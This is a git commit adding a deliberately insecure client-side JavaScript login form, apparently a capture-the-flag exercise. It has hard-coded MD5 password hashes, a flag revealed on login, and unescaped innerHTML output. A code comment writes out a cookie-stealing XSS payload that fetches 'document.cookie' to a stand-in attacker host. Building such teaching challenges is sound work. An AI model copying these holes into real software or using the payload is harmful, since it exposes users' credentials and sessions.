e634b7d8ba705709e9afddbc9ac4ac2b7f69f8f3
Franciuto <francesco.traversetolo@gmail.com>
2025-11-02 01:57:26 +0100

    new version: with local bootstrap

---
+++ JavaScript_Clientside_LoginForm/v2 - bootstrap_local/login.js
@@ -0,0 +1,30 @@
+const users = [
+    { username: "admin", password: md5("admin123"), role: "admin" },
+    { username: "franciuto", password: md5("aura"), role: "user" },
+    { username: "gabibbo", password: "9fb3f6b28debb74180a810c435943037", role: "SuPeR aUrA UsEr" }
+];
+
+const form = document.getElementById("loginForm");
+const output = document.getElementById("output");
+const submitBtn = document.getElementById("submit")
+
+form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    const username = document.getElementById("username").value.trim();
+    const password = md5(document.getElementById("password").value.trim());
+
+    const user = users.find(u => u.username === username && u.password === password);
+
+    if (!user) {
+        output.textContent = "Credenziali errate.";
+        return;
+    } else {
+        // Hope there isn't a user called "</b><script>fetch(document.cookie, Hackerw3bs1t3)</script> <b> you have been hacked" or it's the end
+        output.innerHTML = `Benvenuto <b>${user.username}</b><br>Il tuo ruolo è: <span style="color:red; font-weight: bold;">${user.role}</span></br>`;
+    }
+
+    if (user.role === "SuPeR aUrA UsEr") {
+        output.innerHTML += `<br>here is the SuPeR aUrA flag: flag{md5_cr4ck1n9_1s_th3_w4y}</br>`
+    }
+});
